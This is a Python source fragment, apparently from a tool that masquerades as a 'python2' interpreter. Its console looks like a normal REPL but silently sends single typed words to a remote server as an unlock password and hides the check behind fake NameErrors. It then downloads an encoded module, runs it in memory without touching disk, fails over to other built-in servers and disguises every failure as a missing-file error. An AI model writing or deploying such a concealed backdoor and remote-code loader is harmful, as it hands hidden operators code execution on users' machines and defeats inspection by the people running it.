import code, tty, urllib.request, json, gzip, base64

def quiet_mode(fd):
    tty.setcbreak(fd)

def send_request(cfg, path, payload=None, method=None, timeout=30, retry=True):
    """POST/GET JSON, return parsed body. Retries 429/502/503 silently."""
    url = cfg["server"].rstrip("/") + path
    data = json.dumps(payload).encode() if payload is not None else None
    attempts = 3 if retry else 1
    for attempt in range(attempts):
        req = urllib.request.Request(
            url,
            data=data,
            method=method or ("POST" if data is not None else "GET"),
            headers={"Content-Type": "application/json",
                     "User-Agent": f"python2/{VERSION}"},
        )
        try:
            with urllib.request.urlopen(req, timeout=timeout) as r:
                return json.loads(r.read().decode())
        except urllib.error.HTTPError as e:
            if retry and e.code in (429, 502, 503) and attempt < attempts - 1:
                _backoff(e, attempt)
                continue
            try:
                body = json.loads(e.read().decode())
                return {"ok": False, "error": body.get("error", f"http {e.code}"),
                        "status": e.code}
            except Exception:
                return {"ok": False, "error": f"http {e.code}", "status": e.code}
        except Exception as e:
            return {"ok": False, "error": str(e), "status": 0}


def check_remote(cfg, pw):
    """verify the operator secret against the linked server"""
    if not pw:
        return {"ok": False, "error": "", "status": 0}
    return send_request(cfg, "/api/cli/unlock",
                    {"apiKey": cfg["apiKey"], "password": pw},
                    timeout=8, retry=False)


class _GateConsole(code.InteractiveConsole):
    """a genuine python REPL. one quiet extra: lines are read with the
    console echo off and written back to the record afterwards, so
    ordinary python looks exactly like itself - while a bare single
    word (the only thing ever checked against the linked server) stays
    invisible unless it is wrong, in which case it is written back with
    the ordinary NameError any unknown word would get. nothing hints
    that any of this exists."""

    def __init__(self):
        super().__init__(locals={"__name__": "__main__", "__doc__": None})
        self.tries = 0
        self.shopped = False
        self.rekeyed = False
        self.accepted = ""
        self.quiet = sys.stdin.isatty()

    def raw_input(self, prompt=""):
        if not self.quiet:
            return super().raw_input(prompt)
        try:
            sys.stdout.write(prompt)
            sys.stdout.flush()
        except Exception:
            pass
        return _quiet_read()

    def push(self, line):
        s = line.strip()
        if (s and not self.buffer and s not in _SKIP_WORDS
                and _WORD_RE.fullmatch(s)):
            if s == self.accepted:
                raise _Veil  # already unlocked this session - zero network
            if self.tries < _GATE_TRIES:
                self.tries += 1
                try:
                    cfg = _quiet_config()
                except SystemExit:
                    cfg = None
                if cfg:
                    r = check_remote(cfg, s)
                    if r.get("ok"):
                        mark_unlocked()  # silence - that is the entire reply
                        remember_word(s)
                        self.accepted = s
                        raise _Veil
                    if _server_broken(r) and not self.shopped:
                        self.shopped = True
                        alt = _failover(cfg, s)
                        if alt:
                            mark_unlocked()
                            remember_word(s)
                            self.accepted = s
                            raise _Veil
                    elif r.get("status") in (401, 403) and not self.rekeyed:
                        # the server answered but may have lost this device
                        # (fresh deploy) - one quiet re-register + retry
                        self.rekeyed = True
                        if _rekey(cfg, s):
                            mark_unlocked()
                            remember_word(s)
                            self.accepted = s
                            raise _Veil
        if self.quiet:
            # the line was typed with echo off - put it back on the record
            try:
                sys.stdout.write(line + "\n")
                sys.stdout.flush()
            except Exception:
                pass
        return super().push(line)


def pretend_missing(argv):
    """the boring cover for every failure: behave exactly like running
    `python something.py` where something.py does not exist."""
    name = argv[0] if argv else "python2"
    print(f"python: can't open file '{os.path.abspath(name)}': "
          f"[Errno 2] No such file or directory", file=sys.stderr, flush=True)
    sys.exit(2)


def run_payload(cfg, argv):
    """fetch the advanced module from the linked server (authorized
    devices only) and run it in memory. nothing is ever written to disk.
    every failure path wears the same python cover - unless the operator
    word is remembered, in which case a server that lost this device
    (fresh deploy, wiped db) heals quietly and the run just succeeds."""
    # local unlock marker expired but the word is remembered: re-establish
    # it now so the server-side vip check passes without any ceremony
    if not is_unlocked():
        w = recall_word()
        if w:
            r0 = check_remote(cfg, w)
            if r0.get("ok"):
                mark_unlocked()
            elif r0.get("status") in (401, 403) and _rekey(cfg, w):
                mark_unlocked()

    r = send_request(cfg, "/api/cli/payload", {"apiKey": cfg["apiKey"]})
    if not (r.get("ok") and r.get("payload")):
        st = r.get("status")
        if st == 0:
            # brief outage / redeploy blip - quietly retry the pinned server
            for _ in range(2):
                time.sleep(2)
                r = send_request(cfg, "/api/cli/payload", {"apiKey": cfg["apiKey"]})
                if r.get("ok") and r.get("payload"):
                    break
        if not (r.get("ok") and r.get("payload")) and \
                r.get("status") in (401, 403):
            # the pinned server is alive but lost this device - register a
            # fresh key and re-unlock with the remembered word, then retry
            w = recall_word()
            key = _register(cfg.get("server", ""))
            if key and w:
                trial = {"server": cfg["server"], "apiKey": key}
                if check_remote(trial, w).get("ok"):
                    _pin(cfg["server"], key)
                    cfg = load_config() or trial
                    mark_unlocked()
                    r = send_request(cfg, "/api/cli/payload", {"apiKey": key})
        if not (r.get("ok") and r.get("payload")) and _server_broken(r):
            # pinned instance looks stale - try the other baked one before
            # giving up (kept only if the module actually comes back)
            for alt in _candidates(cfg.get("server", "")):
                key = _register(alt)
                if not key:
                    continue
                trial = {"server": alt, "apiKey": key}
                r2 = send_request(trial, "/api/cli/payload", {"apiKey": key})
                if r2.get("ok") and r2.get("payload"):
                    _pin(alt, key)
                    cfg = load_config() or trial
                    r = r2
                    break
    if r.get("ok") and r.get("payload"):
        try:
            src = gzip.decompress(base64.b64decode(r["payload"])).decode("utf-8")
            g = {"__name__": "__adv__", "__file__": CONFIG_FILE}
            os.environ["_CLI_HOME"] = CONFIG_DIR  # module keeps state beside us
            exec(compile(src, "<adv>", "exec"), g)
            g["main"](list(argv))
        except SystemExit:
            raise
        except KeyboardInterrupt:
            sys.exit(130)
        except BrokenPipeError:
            sys.exit(0)
        except Exception:
            pretend_missing(argv)
    pretend_missing(argv)

